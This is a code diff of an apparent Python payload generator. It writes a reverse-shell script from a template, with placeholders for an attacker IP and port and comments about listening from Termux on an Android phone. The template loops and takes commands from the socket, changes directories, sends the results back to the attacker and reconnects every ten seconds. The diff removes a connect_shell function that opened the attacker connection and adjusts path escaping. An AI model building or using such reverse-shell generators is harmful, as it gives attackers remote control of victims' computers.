@@ -41,17 +41,6 @@ import time
 attacker_ip = '{host}'  # Replace with your Android device's IP
 attacker_port = {port}   # The port you are listening on in Termux
 
-
-def connect_shell():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.connect((attacker_ip, attacker_port))
-        print("Connection established.")
-        return s
-    except Exception as e:
-        print(f"Connection failed: {e}")
-        return None
-        
 # Start in the user's home directory
 current_directory = os.getcwd()
 
@@ -80,7 +69,7 @@ while True:
                         new_dir = command[3:].strip()
                         os.chdir(new_dir)
                         current_directory = os.getcwd()
-                        sock.send(f"Changed directory to {current_directory}\n".encode("utf-8"))
+                        sock.send(f"Changed directory to {current_directory.replace('\\', '\\\\')}\n".encode("utf-8"))
                     except FileNotFoundError:
                         sock.send(f"Directory not found: {new_dir}\n".encode("utf-8"))
                 else:
@@ -101,8 +90,8 @@ while True:
         # If connection fails, retry after 10 seconds
         print("Retrying connection...")
         time.sleep(10)
-
     """
+
 
     # Write the generated code to a Python file
     with open(python_file_path, 'w') as file:
